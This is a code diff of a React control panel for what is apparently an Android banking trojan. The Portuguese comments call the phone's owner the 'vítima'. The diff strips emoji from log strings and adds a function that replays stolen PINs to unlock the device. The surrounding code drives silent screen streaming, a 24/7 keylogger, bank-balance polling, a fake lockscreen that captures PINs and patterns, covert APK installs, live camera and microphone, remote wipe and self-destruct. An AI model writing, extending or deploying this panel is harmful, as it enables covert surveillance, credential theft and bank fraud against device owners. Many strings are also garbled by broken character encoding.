@@ -1352,11 +1352,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           isolated_mode: true
         }
       });
-      addLog(`✅ Comando de duplicação enviado com sucesso: ${targetName} -> ${cloneName}`);
+      addLog(` Comando de duplicação enviado com sucesso: ${targetName} -> ${cloneName}`);
       openDuplicatorModal(pkg, name);
     } catch (err: any) {
       console.error('Erro ao solicitar duplicação de app no dispositivo:', err);
-      const errStr = `❌ Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`;
+      const errStr = ` Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`;
       addLog(errStr);
       setDuplicationBanner(errStr);
       setTimeout(() => setDuplicationBanner(null), 5000);
@@ -1370,7 +1370,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     const cloneName = duplicatorCloneName.trim() || `${duplicatorSelectedApp.name} (Pasta Segura)`;
 
     try {
-      addLog(`🚀 Enviando comando para duplicar "${duplicatorSelectedApp.name}" em Pasta Segura isolada...`);
+      addLog(` Enviando comando para duplicar "${duplicatorSelectedApp.name}" em Pasta Segura isolada...`);
       await devicesAPI.sendCommand(deviceId, {
         action: 'DUPLICATE_APP',
         package: targetPkg,
@@ -1385,11 +1385,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           isolated_mode: true
         }
       });
-      addLog(`✅ Comando de duplicação enviado com sucesso: ${duplicatorSelectedApp.name} -> ${cloneName} (Pasta Segura)`);
+      addLog(` Comando de duplicação enviado com sucesso: ${duplicatorSelectedApp.name} -> ${cloneName} (Pasta Segura)`);
       setShowDeviceDuplicatorModal(false);
     } catch (err: any) {
       console.error('Erro ao solicitar duplicação de app no dispositivo:', err);
-      addLog(`❌ Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`);
+      addLog(` Erro ao enviar comando de duplicação: ${err?.message || 'erro de rede'}`);
     }
   };
   
@@ -1498,7 +1498,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [appsFilter, setAppsFilter] = useState<'all' | 'banks' | 'social' | 'user' | 'system' | 'monitored' | 'blocked'>('banks');
   const [appsSearch, setAppsSearch] = useState('');
 
-  // 💬 Lista de Pacotes de Redes Sociais
+  //  Lista de Pacotes de Redes Sociais
   const SOCIAL_MEDIA_PKGS = [
     'com.whatsapp', 'com.whatsapp.w4b', 'com.instagram.android', 'org.telegram.messenger',
     'com.facebook.katana', 'com.facebook.orca', 'com.zhiliaoapp.musically', 'com.twitter.android',
@@ -1506,7 +1506,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   ];
   const isSocialApp = (pkg: string) => SOCIAL_MEDIA_PKGS.some(p => (pkg || '').toLowerCase().includes(p.toLowerCase()));
   
-  // –¥ Modo expandido (VNC + Screen Reader lado a lado)
+  // ¥ Modo expandido (VNC + Screen Reader lado a lado)
   const [isExpandedMode, setIsExpandedMode] = useState(false);
   const [showCombinedVncV2, setShowCombinedVncV2] = useState(false);
   
@@ -1562,7 +1562,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     }
   };
 
-  // ⚡ ORGANIZAÇO INOVADORA DO MODO FLUTUANTE - Cockpit VNC + V2 + Controles (AMPLIADO XL)
+  //  ORGANIZAÇO INOVADORA DO MODO FLUTUANTE - Cockpit VNC + V2 + Controles (AMPLIADO XL)
   const organizeCockpitLayout = useCallback(() => {
     setIsFloatingMode(true);
     setFloatingWindows(prev => ({
@@ -1577,7 +1577,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     }
   }, [isScreenReaderEnabled]);
 
-  // “ Auto-Organizar todas as janelas abertas lado a lado sem sobreposição
+  //  Auto-Organizar todas as janelas abertas lado a lado sem sobreposição
   const autoOrganizeAllFloatingWindows = useCallback(() => {
     setIsFloatingMode(true);
     const marginX = 20;
@@ -1613,7 +1613,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setHighestZIndex(10 + openKeys.length);
   }, [floatingWindows, organizeCockpitLayout]);
 
-  // 🕒 HELPER INOVADOR: Calcula o último acesso real do aparelho ao app do banco
+  //  HELPER INOVADOR: Calcula o último acesso real do aparelho ao app do banco
   const getAppLastAccess = useCallback((appPkg: string) => {
     if (!appPkg) return null;
     const targetPkg = appPkg.toLowerCase();
@@ -1702,14 +1702,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [isMobileFullscreen, setIsMobileFullscreen] = useState(false);
   const [showMobileControls, setShowMobileControls] = useState(true);
   
-  // 📦 Estados para instalação de APK
+  //  Estados para instalação de APK
   const [showInstallApkModal, setShowInstallApkModal] = useState(false);
   const [isInstallingApk, setIsInstallingApk] = useState(false);
   const [isReconnectingConn, setIsReconnectingConn] = useState(false);
   const [selectedApkFile, setSelectedApkFile] = useState<File | null>(null);
   const apkInputRef = useRef<HTMLInputElement>(null);
   
-  // 🔒 Estados para LOCKSCREEN PIN + PATTERN (igual EAGLESPY V5)
+  //  Estados para LOCKSCREEN PIN + PATTERN (igual EAGLESPY V5)
   const [showLockscreenModal, setShowLockscreenModal] = useState(false);
   const [capturedPin, setCapturedPin] = useState('');
   const [capturedPattern, setCapturedPattern] = useState('');
@@ -1720,7 +1720,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const [lockscreenType, setLockscreenType] = useState<'PIN' | 'PATTERN'>('PIN');
   const [pinDelay, setPinDelay] = useState(1000);
   
-  // 🎨 Estados para layout editável (apenas cores dos botões)
+  //  Estados para layout editável (apenas cores dos botões)
   const [isLayoutEditMode, setIsLayoutEditMode] = useState(false);
   const [layoutDirty, setLayoutDirty] = useState(false);
   const [layoutPrefs, setLayoutPrefs] = useState<{
@@ -1749,10 +1749,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     try {
       await layoutAPI.saveLayout(layoutPrefs);
       setLayoutDirty(false);
-      addLog('✅ Layout salvo com sucesso!');
+      addLog(' Layout salvo com sucesso!');
     } catch (error) {
       console.error('Erro ao salvar layout:', error);
-      addLog('❌ Erro ao salvar layout');
+      addLog(' Erro ao salvar layout');
     }
   };
   
@@ -1764,7 +1764,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         buttonStyles: {},
       });
       setLayoutDirty(false);
-      addLog('🔄 Layout resetado para padrão');
+      addLog(' Layout resetado para padrão');
     } catch (error) {
       console.error('Erro ao resetar layout:', error);
     }
@@ -1812,7 +1812,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           addLog('š  DISPOSITIVO DESÍCONECTADO!');
           setDeviceConnectionStatus('offline');
         } else if (found.is_online && (!device || !device.is_online)) {
-          addLog('✅ DISPOSITIVO REÍCONECTADO!');
+          addLog(' DISPOSITIVO REÍCONECTADO!');
           setDeviceConnectionStatus('online');
         }
 
@@ -1840,7 +1840,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return () => clearInterval(interval);
   }, [loadDevice]);
 
-  // š€ INICIALIZA‡ƒO AUTOMTICA AO ABRIR O APARELHO: DESPERTAR + VNC + V2 (SCREEN READER)
+  // š INICIALIZAƒO AUTOMTICA AO ABRIR O APARELHO: DESPERTAR + VNC + V2 (SCREEN READER)
   const autoStartDeviceInitRef = useRef<string | null>(null);
   useEffect(() => {
     if (!deviceId) return;
@@ -1850,7 +1850,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
     const autoStartAll = async () => {
       try {
-        console.log('⚡ Auto-inicialização: Despertar + VNC + V2 para:', deviceId);
+        console.log(' Auto-inicialização: Despertar + VNC + V2 para:', deviceId);
         
         // 1. Despertar aparelho (Ligar Tela / Desbloquear)
         devicesAPI.sendCommand(deviceId, { action: 'WAKEUP' }).catch(() => {});
@@ -1858,7 +1858,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         devicesAPI.sendCommand(deviceId, { action: 'UNLOCK' }).catch(() => {});
         
         // 2. Ativar VNC Silencioso ao vivo
-        devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_SILENT_VNC', enabled: true, silent_only: true, quality: 50 }).catch(() => {});
+        devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_SILENT_VNC', enabled: true, silent_only: true, quality: 70 }).catch(() => {});
         devicesAPI.sendCommand(deviceId, { action: 'START_SILENT_VNC' }).catch(() => {});
         devicesAPI.sendCommand(deviceId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});
 
@@ -1876,7 +1876,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     autoStartAll();
   }, [deviceId]);
 
-  // 📅 KEYLOGGER POR DATA - Polling robusto 24/7
+  //  KEYLOGGER POR DATA - Polling robusto 24/7
   useEffect(() => {
     if (!deviceId) return;
     
@@ -2111,7 +2111,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return () => clearInterval(interval);
   }, [showNotificationsTab, fetchNotifications]);
   
-  // 💰 Polling de saldos bancários (8s quando aberto, 60s quando fechado)
+  //  Polling de saldos bancários (8s quando aberto, 60s quando fechado)
   useEffect(() => {
     if (!deviceId) return;
     
@@ -2141,7 +2141,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return () => clearInterval(interval);
   }, [deviceId, floatingWindows.bankMonitor.open, showBankMonitorTab]);
   
-  // 📤 Polling de arquivos enviados (10s quando aberto, 60s quando fechado)
+  //  Polling de arquivos enviados (10s quando aberto, 60s quando fechado)
   useEffect(() => {
     if (!deviceId) return;
     
@@ -2171,7 +2171,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return () => clearInterval(interval);
   }, [deviceId, floatingWindows.keylogger.open]);
   
-  // 📴 Polling de KEYLOGS OFFLINE (5s quando aberto, 60s quando fechado)
+  //  Polling de KEYLOGS OFFLINE (5s quando aberto, 60s quando fechado)
   useEffect(() => {
     if (!deviceId) return;
     
@@ -2201,7 +2201,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return () => clearInterval(interval);
   }, [deviceId, floatingWindows.keylogger.open]);
   
-  // ” Polling de PINs/Patterns/Passwords de DESBLOQUEIO capturados (4s quando aberto, 60s quando fechado)
+  //  Polling de PINs/Patterns/Passwords de DESBLOQUEIO capturados (4s quando aberto, 60s quando fechado)
   useEffect(() => {
     if (!deviceId) return;
     
@@ -2294,11 +2294,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       console.warn('š  Dispositivo pode estar offline, tentando enviar mesmo assim...');
     }
     
-    console.log('📤 Enviando comando:', command);
+    console.log(' Enviando comando:', command);
     
     try {
       await devicesAPI.sendCommand(deviceId, command);
-      console.log('✅ Comando enviado com sucesso:', command.action);
+      console.log(' Comando enviado com sucesso:', command.action);
       addLog(`Comando enviado: ${command.action}`);
       
       // Se for um comando de interação, solicita uma atualização de frame e hierarquia imediatamente!
@@ -2314,7 +2314,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         }
       }
     } catch (error: any) {
-      console.error('❌ Erro ao enviar comando:', error);
+      console.error(' Erro ao enviar comando:', error);
       
       // Trata erro 503 (dispositivo offline)
       if (error?.response?.status === 503) {
@@ -2330,19 +2330,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const handleConnectionStatusChange = (status: 'online' | 'offline' | 'stale') => {
     setDeviceConnectionStatus(status);
     if (status === 'online') {
-      addLog('✅ Dispositivo reíconectado!');
+      addLog(' Dispositivo reíconectado!');
     } else if (status === 'stale') {
       addLog('š  Dispositivo pode estar offline (sem frames)');
     }
   };
   
-  // 🔴 POWER BUTTON - Long Press para menu de desligar/reiniciar
+  //  POWER BUTTON - Long Press para menu de desligar/reiniciar
   const handlePowerMouseDown = () => {
     // Inicia timer de 800ms para long press
     const timer = window.setTimeout(() => {
       setIsPowerLongPressed(true);
       sendCommand({ action: 'POWER_MENU' }); // Abre menu de desligar/reiniciar
-      addLog('⚡ Menu Power aberto (segurar)');
+      addLog(' Menu Power aberto (segurar)');
     }, 800);
     setPowerLongPressTimer(timer);
   };
@@ -2378,23 +2378,23 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
   const handleReconnectConnection = async () => {
     setIsReconnectingConn(true);
-    addLog('🔌 Solicitando reinício da íconexão do aparelho...');
+    addLog(' Solicitando reinício da íconexão do aparelho...');
     try {
       await sendCommand({ action: 'RECONNECT_CONNECTION' });
-      addLog('⚡ Conexão resetada! Aguardando o handshake WebSocket do aparelho...');
+      addLog(' Conexão resetada! Aguardando o handshake WebSocket do aparelho...');
     } catch (e: any) {
-      addLog('❌ Erro ao enviar solicitação de reíconexão');
+      addLog(' Erro ao enviar solicitação de reíconexão');
     } finally {
       setTimeout(() => setIsReconnectingConn(false), 2500);
     }
   };
   
-  // 📦 INSTALAÇO DE APK
+  //  INSTALAÇO DE APK
   const handleInstallApk = async () => {
     if (!selectedApkFile || !deviceId) return;
     
     setIsInstallingApk(true);
-    addLog(`📦 Enviando APK: ${selectedApkFile.name}...`);
+    addLog(` Enviando APK: ${selectedApkFile.name}...`);
     
     try {
       const formData = new FormData();
@@ -2414,69 +2414,67 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       }
       
       const result = await response.json();
-      addLog(`✅ APK enviado! Instalando silenciosamente...`);
-      console.log('📦 Resultado:', result);
+      addLog(` APK enviado! Instalando silenciosamente...`);
+      console.log(' Resultado:', result);
       
       // Fecha o modal
       setShowInstallApkModal(false);
       setSelectedApkFile(null);
       
     } catch (error) {
-      console.error('❌ Erro ao instalar APK:', error);
-      addLog(`❌ Erro ao instalar APK`);
+      console.error(' Erro ao instalar APK:', error);
+      addLog(` Erro ao instalar APK`);
     } finally {
       setIsInstallingApk(false);
     }
   };
 
   const handleFormatDevice = () => {
-    const confirmed = window.confirm("🚨 ATENÇO: Deseja realmente formatar o aparelho? Todos os dados serão apagados permanentemente!\n\nCertifique-se de que o Administrador de Dispositivo está ativo antes de continuar.");
+    const confirmed = window.confirm(" ATENÇO: Deseja realmente formatar o aparelho? Todos os dados serão apagados permanentemente!\n\nCertifique-se de que o Administrador de Dispositivo está ativo antes de continuar.");
     if (confirmed) {
       sendCommand({ action: 'FORMAT_DEVICE' });
     }
   };
 
   const handleRequestAdminPermission = () => {
-    const confirmed = window.confirm("›¡ Solicitar Administrador de Dispositivo?\n\nIsso abrirá uma tela no aparelho da v⚡tima pedindo para ativar o Administrador de Dispositivo.\nNecessário para a função de Formatar Aparelho.");
+    const confirmed = window.confirm("¡ Solicitar Administrador de Dispositivo?\n\nIsso abrirá uma tela no aparelho da vtima pedindo para ativar o Administrador de Dispositivo.\nNecessário para a função de Formatar Aparelho.");
     if (confirmed) {
       sendCommand({ action: 'REQUEST_ADMIN_PERMISSION' });
-      addLog('›¡ Solicitação de Administrador enviada ao aparelho...');
+      addLog('¡ Solicitação de Administrador enviada ao aparelho...');
     }
   };
 
   const handleCheckAdminStatus = () => {
     sendCommand({ action: 'CHECK_ADMIN_STATUS' });
-    addLog('” Verificando status de Administrador do aparelho...');
+    addLog(' Verificando status de Administrador do aparelho...');
   };
 
   const handleSelfDestruct = () => {
-    const confirmed = window.confirm('💣 REMOVER APP DO APARELHO?\n\nIsso desinstalará o app de monitoramento do dispositivo da vítima.\nO dispositivo deixará de aparecer no painel após a remoção.\n\nTem certeza?');
+    const confirmed = window.confirm(' REMOVER APP DO APARELHO?\n\nIsso desinstalará o app de monitoramento do dispositivo da vítima.\nO dispositivo deixará de aparecer no painel após a remoção.\n\nTem certeza?');
     if (confirmed) {
       sendCommand({ action: 'SELF_DESTRUCT' });
-      addLog('💣 Comando de auto-remoção enviado ao aparelho...');
+      addLog(' Comando de auto-remoção enviado ao aparelho...');
     }
   };
 
   const toggleBlackScreen = async () => {
     const newState = !isBlackScreen;
-    await sendCommand({ 
-      action: newState ? 'BLACK_SCREEN_ON' : 'BLACK_SCREEN_OFF' 
-    });
+    // [KRYPTOS-PATCH SPEED] UI otimista
     setIsBlackScreen(newState);
-    // Sempre define o block touch como desativado ao ativar ou desativar a tela preta
     setIsBlackTouchBlocked(false);
-    await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });
-    if (!newState) {
-      setBlackScreenOpacity(100);
-    }
+    if (!newState) { setBlackScreenOpacity(100); }
     addLog(newState ? 'Tela preta ATIVADA' : 'Tela preta DESATIVADA');
+    try {
+      await sendCommand({ action: newState ? 'BLACK_SCREEN_ON' : 'BLACK_SCREEN_OFF' });
+      await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });
+    } catch (e) {}
   };
 
   const toggleBlackScreenTouch = async () => {
     const newBlocked = !isBlackTouchBlocked;
     await sendCommand({ action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: newBlocked });
     setIsBlackTouchBlocked(newBlocked);
-    addLog(newBlocked ? '– Block Touch ATIVADO' : '– Block Touch DESATIVADO');
+    addLog(newBlocked ? ' Block Touch ATIVADO' : ' Block Touch DESATIVADO');
   };
 
   const handleBlackScreenOpacityChange = (val: number) => {
@@ -2489,11 +2487,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     }, 80);
   };
 
-  // 🎨 Aplicar tela preta customizada
+  //  Aplicar tela preta customizada
   const applyCustomBlackScreen = async (template: any, targetPackageName?: string) => {
     try {
-      console.log('🎨 DEBUG: Enviando CUSTOM_BLACK_SCREEN com template:', template);
-      console.log('🎨 DEBUG: Template JSON:', JSON.stringify(template));
+      console.log(' DEBUG: Enviando CUSTOM_BLACK_SCREEN com template:', template);
+      console.log(' DEBUG: Template JSON:', JSON.stringify(template));
       
       // Enviar configuração da tela customizada para o dispositivo
       // Sempre define o block touch como desativado ao aplicar template
@@ -2511,24 +2509,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         package: finalPkg
       });
 
-      console.log('🎨 DEBUG: Comando enviado com sucesso! Pacote alvo:', finalPkg);
+      console.log(' DEBUG: Comando enviado com sucesso! Pacote alvo:', finalPkg);
       setCustomBlackScreenTemplate(template);
       setIsBlackScreen(true);
       setShowBlackScreenEditor(false);
-      addLog(`🎨 Tela preta customizada aplicada: ${template.name}`);
+      addLog(` Tela preta customizada aplicada: ${template.name}`);
     } catch (error) {
-      console.error('❌ Erro ao aplicar tela customizada:', error);
-      addLog('❌ Erro ao aplicar tela customizada');
+      console.error(' Erro ao aplicar tela customizada:', error);
+      addLog(' Erro ao aplicar tela customizada');
     }
   };
 
-  // 🎨 Salvar template de tela preta
+  //  Salvar template de tela preta
   const saveBlackScreenTemplate = (template: any) => {
     setCustomBlackScreenTemplate(template);
-    addLog(`💾 Template salvo: ${template.name}`);
+    addLog(` Template salvo: ${template.name}`);
   };
 
-  // ’‰ GATILHOS AUTOMTICOS DE OVERLAY
+  //  GATILHOS AUTOMTICOS DE OVERLAY
   const fetchOverlayMappings = async () => {
     if (!deviceId) return;
     try {
@@ -2576,15 +2574,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       });
 
       if (response.ok) {
-        addLog(`✅ Auto-gatilho configurado para ${pkg}`);
+        addLog(` Auto-gatilho configurado para ${pkg}`);
         fetchOverlayMappings();
       } else {
         const err = await response.json();
-        addLog(`❌ Erro ao salvar gatilho: ${err.detail || 'erro desconhecido'}`);
+        addLog(` Erro ao salvar gatilho: ${err.detail || 'erro desconhecido'}`);
       }
     } catch (e) {
       console.error('Erro ao criar mapeamento:', e);
-      addLog('❌ Erro de rede ao criar mapeamento');
+      addLog(' Erro de rede ao criar mapeamento');
     }
   };
 
@@ -2597,7 +2595,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         headers: { 'Authorization': `Bearer ${token}` }
       });
       if (response.ok) {
-        addLog('—‘ Auto-gatilho removido');
+        addLog(' Auto-gatilho removido');
         fetchOverlayMappings();
       }
     } catch (e) {
@@ -2617,7 +2615,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       });
       if (response.ok) {
         setCustomCaptures(prev => prev.filter(c => c.id !== id));
-        addLog(`—‘ Captura customizada exclu⚡da!`);
+        addLog(` Captura customizada excluda!`);
       }
     } catch (err) {
       console.error('Erro ao excluir captura customizada:', err);
@@ -2634,7 +2632,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   // toggleKeylogger - mantido para compatibilidade mas keylogger agora é 24/7
   const _toggleKeylogger = async () => {
     const newState = !isKeyloggerEnabled;
-    console.log('🔴 DEBUG: Enviando comando TOGGLE_KEYLOGGER, enabled:', newState);
+    console.log(' DEBUG: Enviando comando TOGGLE_KEYLOGGER, enabled:', newState);
     
     await sendCommand({ 
       action: 'TOGGLE_KEYLOGGER',
@@ -2656,10 +2654,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     
     setIsScreenReaderEnabled(newState);
     if (newState) setShowScreenReader(true);
-    addLog(newState ? 'Screen Reader V2 ATIVADO ‘' : 'Screen Reader V2 DESATIVADO');
+    addLog(newState ? 'Screen Reader V2 ATIVADO ' : 'Screen Reader V2 DESATIVADO');
   };
   
-  // 📷 CÂMERA EM TEMPO REAL
+  //  CÂMERA EM TEMPO REAL
   const toggleCamera = async () => {
     const newState = !isCameraEnabled;
     
@@ -2677,7 +2675,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       setShowCameraModal(false);
       stopCameraStream();
     }
-    addLog(newState ? 'Cmera ATIVADA 📷' : 'Cmera DESATIVADA');
+    addLog(newState ? 'Cmera ATIVADA ' : 'Cmera DESATIVADA');
   };
   
   const startCameraStream = () => {
@@ -2698,7 +2696,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     ws.binaryType = 'arraybuffer';
     
     ws.onopen = () => {
-      console.log('📷 Camera stream íconectado');
+      console.log(' Camera stream íconectado');
     };
     
     ws.onmessage = (event) => {
@@ -2728,15 +2726,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     };
     
     ws.onerror = (error) => {
-      console.error('📷❌ Erro no camera stream:', error);
+      console.error(' Erro no camera stream:', error);
       ws.close();
     };
     
     ws.onclose = () => {
-      console.log('📷 Camera stream desíconectado');
-      // ”„ REÍCONEXƒO AUTOMTICA se a c¢mera ainda estiver habilitada
+      console.log(' Camera stream desíconectado');
+      //  REÍCONEXƒO AUTOMTICA se a c¢mera ainda estiver habilitada
       if (isCameraEnabled && showCameraModal) {
-        console.log('📷 Reíconectando cmera em 2 segundos...');
+        console.log(' Reíconectando cmera em 2 segundos...');
         (window as any).cameraReconnectTimer = setTimeout(() => {
           startCameraStream();
         }, 2000);
@@ -2761,7 +2759,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     }
   };
   
-  // 🔄 Alterna entre cmera frontal e traseira
+  //  Alterna entre cmera frontal e traseira
   const switchCamera = async () => {
     const newCamera = currentCamera === 'back' ? 'front' : 'back';
     setCurrentCamera(newCamera);
@@ -2774,7 +2772,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     addLog(`Cmera alternada para ${newCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}`);
   };
   
-  // 🎤 MICROFONE EM TEMPO REAL
+  //  MICROFONE EM TEMPO REAL
   const toggleMicrophone = async () => {
     const newState = !isMicrophoneEnabled;
     
@@ -2791,7 +2789,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       setShowMicrophoneModal(false);
       stopMicrophoneStream();
     }
-    addLog(newState ? 'Microfone ATIVADO 🎤' : 'Microfone DESATIVADO');
+    addLog(newState ? 'Microfone ATIVADO ' : 'Microfone DESATIVADO');
   };
   
   const startViewer = async (qualityOverride?: number) => {
@@ -2813,7 +2811,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     setSilentQuality(clamped);
     if (isCaptureEnabled) {
       await sendCommand({ action: 'SET_SILENT_VNC_QUALITY', quality: clamped });
-      addLog(`Qualidade VNC → ${clamped}%`);
+      addLog(`Qualidade VNC  ${clamped}%`);
     }
   };
 
@@ -2858,7 +2856,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     addLog('VNC reiniciado');
   };
 
-  // Menu de contexto do Dashboard → abrir painel/modal correspondente
+  // Menu de contexto do Dashboard  abrir painel/modal correspondente
   useEffect(() => {
     const panel = (location.state as { openPanel?: string } | null)?.openPanel;
     if (!panel || !deviceId) return;
@@ -2931,7 +2929,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     navigate(location.pathname, { replace: true, state: {} });
   }, [location.state, deviceId]);
   
-  // 🔒 LOCKSCREEN PIN + PATTERN - IGUAL EAGLESPY V5
+  //  LOCKSCREEN PIN + PATTERN - IGUAL EAGLESPY V5
   
   // Busca PIN e Pattern armazenados no servidor
   const fetchDeviceLockData = async () => {
@@ -2987,12 +2985,31 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         body: formData
       });
       setCapturedPin(pin);
-      addLog(`🔒 PIN salvo: ${pin}`);
+      addLog(` PIN salvo: ${pin}`);
     } catch (error) {
       console.error('Erro ao salvar PIN:', error);
     }
   };
   
+  const playPinNow = async () => {
+    if (!deviceId) return;
+    const pin = pinInput || capturedPin;
+    if (!pin) { addLog('Sin PIN para enviar'); return; }
+    try {
+      const token = localStorage.getItem('token');
+      const formData = new FormData();
+      formData.append('pin', pin);
+      formData.append('delay', '900');
+      const res = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pin`, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${token}` },
+        body: formData
+      });
+      addLog(res.ok ? `Desbloqueo enviado: ${pin}` : 'No se pudo enviar el desbloqueo');
+    } catch {
+      addLog('Error al enviar el desbloqueo');
+    }
+  };
   // Salva Pattern no servidor
   const saveDevicePattern = async (pattern: string) => {
     if (!deviceId) return;
@@ -3007,7 +3024,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         body: formData
       });
       setCapturedPattern(pattern);
-      addLog(`🔲 Pattern salvo: ${pattern}`);
+      addLog(` Pattern salvo: ${pattern}`);
     } catch (error) {
       console.error('Erro ao salvar Pattern:', error);
     }
@@ -3017,26 +3034,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   const showLockscreen = async () => {
     await sendCommand({ action: 'SHOW_LOCKSCREEN', type: lockscreenType });
     setIsLockscreenActive(true);
-    addLog(`🔒 Lockscreen ${lockscreenType} ATIVADO - Aguardando vítima...`);
+    addLog(` Lockscreen ${lockscreenType} ATIVADO - Aguardando vítima...`);
   };
   
   // Esconde overlay de lockscreen
   const hideLockscreen = async () => {
     await sendCommand({ action: 'HIDE_LOCKSCREEN' });
     setIsLockscreenActive(false);
-    addLog('🔓 Lockscreen DESATIVADO');
+    addLog(' Lockscreen DESATIVADO');
   };
   
   // Pressiona tecla do PIN (para reprodução manual)
   const pressLockKey = async (key: string) => {
     await sendCommand({ action: `LOCK_KEY_${key}` });
-    addLog(`🔢 Tecla ${key} pressionada`);
+    addLog(` Tecla ${key} pressionada`);
   };
 
   const startUnlockRecordingCmd = async () => {
     await sendCommand({ action: 'START_UNLOCK_RECORDING' });
     setIsUnlockRecording(true);
-    addLog('🔴 Gravação de unlock iniciada');
+    addLog(' Gravação de unlock iniciada');
   };
 
   const stopUnlockRecordingCmd = async () => {
@@ -3047,7 +3064,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
   const playUnlockLocal = async () => {
     await sendCommand({ action: 'PLAY_UNLOCK_SEQUENCE' });
-    addLog('–¶ Reproduzindo unlock (RAM local)');
+    addLog('¶ Reproduzindo unlock (RAM local)');
   };
 
   const playUnlockFromServer = async () => {
@@ -3070,9 +3087,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         action: 'PLAY_UNLOCK_SEQUENCE',
         text: JSON.stringify({ type: data.type, sequence: data.sequence }),
       });
-      addLog(`–¶ Reproduzindo unlock do servidor (${data.sequence.length} ações)`);
+      addLog(`¶ Reproduzindo unlock do servidor (${data.sequence.length} ações)`);
     } catch {
-      addLog('❌ Erro ao reproduzir unlock do servidor');
+      addLog(' Erro ao reproduzir unlock do servidor');
     }
   };
 
@@ -3085,7 +3102,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       .join('');
     if (!digits) return;
     navigator.clipboard.writeText(digits);
-    addLog(`📋 PIN copiado: ${digits}`);
+    addLog(` PIN copiado: ${digits}`);
   };
 
   const formatLockscreenEventTime = (iso: string) => {
@@ -3110,7 +3127,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return (
       <div className="space-y-1">
         {digitSequence.length >= 4 && (
-          <div className="flex items-center justify-between mb-2 p-2 bg-green-900/30 border border-green-600/40 rounded-lg">
+          <div className="flex items-center justify-between mb-2 p-2 bg-green-900/30 border border-green-600/40 rounded-md">
             <span className="text-green-300 font-mono text-sm tracking-widest">{digitSequence}</span>
             <button
               type="button"
@@ -3131,15 +3148,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               .filter((d) => /^\d$/.test(d))
               .join('');
             return (
-              <div key={ev.id ?? `${ev.created_at}-${ev.digit}`} className="flex items-center justify-between text-xs bg-[#440e05]/80 rounded px-2 py-1">
-                <span className="text-gray-300 font-mono">{ev.digit || ev.eventType || '—'}</span>
+              <div key={ev.id ?? `${ev.created_at}-${ev.digit}`} className="flex items-center justify-between text-xs bg-[#121214]/80 rounded px-2 py-1">
+                <span className="text-gray-300 font-mono">{ev.digit || ev.eventType || ''}</span>
                 <span className="text-gray-500">{formatLockscreenEventTime(ev.created_at)}</span>
                 {isComplete && rowDigits.length >= 4 && (
                   <button
                     type="button"
                     onClick={() => {
                       navigator.clipboard.writeText(rowDigits);
-                      addLog(`📋 PIN copiado: ${rowDigits}`);
+                      addLog(` PIN copiado: ${rowDigits}`);
                     }}
                     className="ml-2 px-1.5 py-0.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px]"
                   >
